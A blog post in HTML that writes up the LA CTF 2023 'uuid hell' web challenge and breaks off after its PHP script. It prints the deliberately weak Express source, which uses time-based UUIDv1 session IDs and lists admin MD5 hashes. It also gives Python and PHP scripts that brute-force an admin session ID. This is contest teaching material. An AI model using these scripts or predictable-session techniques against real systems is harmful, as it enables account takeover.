<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>uuid hell - LA CTF 2023 - My Blog</title><meta name="Description" content="Don&#39;t book a cover by it&#39;s judge"><meta property="og:title" content="uuid hell - LA CTF 2023" />
<meta property="og:description" content="
    tl;dr
It uses uuidv1 which is time-based
We get the user uid from the cookie
Then create an admin and get all the current admin hashes as an array from the web page
Create another user
Brutefoce the first eight bytes of the uuid in the range and check with each hash in the array
Use the one that matches
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://r0h1t.me/blog/posts/uuid-hell/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-15T00:00:00+05:30" />
<meta property="article:modified_time" content="2023-02-15T00:00:00+05:30" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="uuid hell - LA CTF 2023"/>
<meta name="twitter:description" content="
    tl;dr
It uses uuidv1 which is time-based
We get the user uid from the cookie
Then create an admin and get all the current admin hashes as an array from the web page
Create another user
Brutefoce the first eight bytes of the uuid in the range and check with each hash in the array
Use the one that matches
"/>
<meta name="application-name" content="My Blog">
<meta name="apple-mobile-web-app-title" content="My Blog">

<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://r0h1t.me/blog/posts/uuid-hell/" /><link rel="prev" href="http://r0h1t.me/blog/posts/codebox/" /><link rel="next" href="http://r0h1t.me/blog/posts/queue-up/" /><link rel="stylesheet" href="/blog/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/blog/css/color.css"><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "uuid hell - LA CTF 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/r0h1t.me\/blog\/posts\/uuid-hell\/"
        },"genre": "posts","keywords": "web, lactf23-writeups, ctf, writeup, hash-collision, uuid","wordcount":  611 ,
        "url": "http:\/\/r0h1t.me\/blog\/posts\/uuid-hell\/","datePublished": "2023-02-15T00:00:00+05:30","dateModified": "2023-02-15T00:00:00+05:30","publisher": {
            "@type": "Organization",
            "name": "Rohit"},"authors": [{
                        "@type": "Person",
                        "name": "Rohit"                    
                    }],"description": ""
    }
    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
</head>

<body header-desktop="" header-mobile=""><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-L6TEV86QF7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-L6TEV86QF7');
</script>
<header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/blog/" title="My Blog">My Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/blog/posts/" title="Posts"> Posts </a><a class="menu-item" href="/blog/tags/"> Tags </a><a class="menu-item" href="/blog/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="#" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/blog/" title="My Blog">My Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="#" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/blog/posts/" title="Posts">Posts</a><a class="menu-item" href="/blog/tags/" title="">Tags</a><a class="menu-item" href="/blog/categories/" title="">Categories</a><a href="#" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">uuid hell - LA CTF 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='http://r0h1t.me/blog/authors/rohit'>Rohit</a></span>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/blog/categories/lactf23-writeups/"><i class="far fa-folder fa-fw"></i>lactf23-writeups</a>&nbsp;<a href="/blog/categories/all-writeups/"><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-02-15">2023-02-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-02-15">2023-02-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;611 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;<span id="/blog/posts/uuid-hell/" class="leancloud_visitors" data-flag-title="uuid hell - LA CTF 2023">
                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path="/blog/posts/uuid-hell/"></span>&nbsp;views
                    </span>&nbsp;<span id="/blog/posts/uuid-hell/" class="comment_count" data-flag-title="uuid hell - LA CTF 2023">
                        <i class="far fa-comments fa-fw"></i>&nbsp;<span class="waline-comment-count" id="waline-comment-count" data-path="/blog/posts/uuid-hell/"></span>&nbsp;comments
                    </span>&nbsp;</div>
        </div><div class="content" id="content"><h4 id="tldr" class="headerLink">
    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
<li>It uses uuidv1 which is time-based</li>
<li>We get the user uid from the cookie</li>
<li>Then create an admin and get all the current admin hashes as an array from the web page</li>
<li>Create another user</li>
<li>Brutefoce the first eight bytes of the uuid in the range and check with each hash in the array</li>
<li>Use the one that matches</li>
</ul>
<h2 id="description" class="headerLink">
    <a href="#description" class="header-mark"></a>Description</h2><p>UUIDs are the best! I love them (if you couldn&rsquo;t tell)!</p>
<ul>
<li><strong>Author</strong> : burturt</li>
<li><strong>Category</strong> : Web</li>
<li><strong>Points</strong> : 391</li>
<li><strong>Solves</strong> : 165</li>
</ul>
<h2 id="solution" class="headerLink">
    <a href="#solution" class="header-mark"></a>Solution</h2><h3 id="understanding-the-challenge" class="headerLink">
    <a href="#understanding-the-challenge" class="header-mark"></a>Understanding the challenge</h3><p>So the challenge gives us a web page where we can create users and admins. We can also see the list of admin&rsquo;s and user&rsquo;s id hashes (most recent 50 hashes). We can get the regular user&rsquo;s cookie but we can&rsquo;t get the admin cookie we can only create admin users. We can also see the source code for the web page.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;uuid&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">randomUUID</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">v1</span><span class="p">({</span><span class="s1">&#39;node&#39;</span><span class="o">:</span> <span class="p">[</span><span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">],</span> <span class="s1">&#39;clockseq&#39;</span><span class="o">:</span> <span class="mb">0b10101001100100</span><span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">adminuuids</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">useruuids</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">isAdmin</span><span class="p">(</span><span class="nx">uuid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">uuid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">isUuid</span><span class="p">(</span><span class="nx">uuid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">uuid</span><span class="p">.</span><span class="nx">length</span> <span class="o">!=</span> <span class="mi">36</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">c</span> <span class="k">of</span> <span class="nx">uuid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/[-a-f0-9]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">c</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getUsers</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">output</span> <span class="o">=</span> <span class="s2">&#34;&lt;strong&gt;Admin users:&lt;/strong&gt;\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">adminuuid</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span> <span class="o">+</span> <span class="nx">adminuuid</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">output</span> <span class="o">+=</span> <span class="sb">`&lt;tr&gt;&lt;td&gt;</span><span class="si">${</span><span class="nx">hash</span><span class="si">}</span><span class="sb">&lt;/td&gt;&lt;/tr&gt;\n`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="nx">output</span> <span class="o">+=</span> <span class="s2">&#34;&lt;br&gt;&lt;br&gt;&lt;strong&gt;Regular users:&lt;/strong&gt;\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">useruuids</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">useruuid</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">useruuid</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">output</span> <span class="o">+=</span> <span class="sb">`&lt;tr&gt;&lt;td&gt;</span><span class="si">${</span><span class="nx">hash</span><span class="si">}</span><span class="sb">&lt;/td&gt;&lt;/tr&gt;\n`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;cookie-parser&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">id</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isUuid</span><span class="p">(</span><span class="nx">id</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">id</span> <span class="o">=</span> <span class="nx">randomUUID</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">useruuids</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isAdmin</span><span class="p">(</span><span class="nx">id</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;You are logged in as &#34;</span> <span class="o">+</span> <span class="nx">id</span> <span class="o">+</span> <span class="s2">&#34;&lt;br&gt;&lt;br&gt;&#34;</span> <span class="o">+</span> <span class="nx">getUsers</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/createadmin&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">adminid</span> <span class="o">=</span> <span class="nx">randomUUID</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">adminuuids</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">adminid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Admin account created.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span><span class="p">);</span>
</span></span></code></pre></div><p>Here we can see that the website uses <a href="https://www.sohamkamani.com/uuid-versions-explained/#v1--uniqueness" target="_blank" rel="noopener noreferrer">uuidv1</a>. UUID V1 is weak as it is based on time and some parts are constant. Only the first 8 bytes are changing.</p>
<p><a class="lightgallery" href="images/constant.png" title="constant" data-thumbnail="images/constant.png">
        <img
            
            loading="lazy"
            src="images/constant.png"
            srcset="images/constant.png, images/constant.png 1.5x, images/constant.png 2x"
            sizes="auto"
            alt="images/constant.png">
    </a></p>
<p>So we easily brute-force it and get the admin cookie. That&rsquo;s what we thought</p>
<h3 id="bruteforcing" class="headerLink">
    <a href="#bruteforcing" class="header-mark"></a>Bruteforcing</h3><p>So we started making a python script for that. <a href="files/exp.py" rel="">code</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://uuid-hell.lac.tf/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">uuid</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&#34;createadmin&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uuid2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_hashs</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">admin_hashs</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">10</span><span class="p">],</span><span class="n">admin_hashs</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Length:&#34;</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">admin_hashs</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Regular UUID:&#34;</span><span class="p">,</span><span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Regular UUID2:&#34;</span><span class="p">,</span><span class="n">uuid2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;php exp.php &#34;</span><span class="o">+</span><span class="n">uuid</span><span class="o">+</span><span class="s2">&#34; &#34;</span><span class="o">+</span><span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">admin_hashs</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34; &#34;</span><span class="o">+</span><span class="n">uuid2</span><span class="p">)</span>
</span></span></code></pre></div><p>And for brute-forcing, we used PHP as it will be faster. <a href="files/exp.php" rel="">code</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$uuid</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$admin_hash</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$uuid2</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$admin_hashs</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span> <span class="nv">$admin_hash</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$start</span> <span class="o">=</span> <span class="nx">hexdec</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$uuid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$end</span> <span class="o">=</span> <span class="nx">hexdec</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$uuid2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$uuid</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$uuid</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Starting Brute Force... &#34;</span> <span class="o">.</span> <span class="nv">$start</span> <span class="o">.</span> <span class="s2">&#34; &#34;</span> <span class="o">.</span> <span class="nv">$uuid</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Admin Hash: &#34;</span> <span class="o">.</span> <span class="nv">$admin_hash</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$start</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$end</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;-&#34;</span> <span class="o">.</span> <span class="nv">$uuid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Trying: &#34;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;-&#34;</span> <span class="o">.</span> <span class="nv">$uuid</span> <span class="o">.</span> <span class="s2">&#34; &#34;</span> <span class="o">.</span> <span class="nv">$hash</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$hash</span><span class="p">,</span> <span class="nv">$admin_hashs</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Admin UUID: &#34;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;-&#34;</span> <span class="o">.</span> <span class="nv">$uuid</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
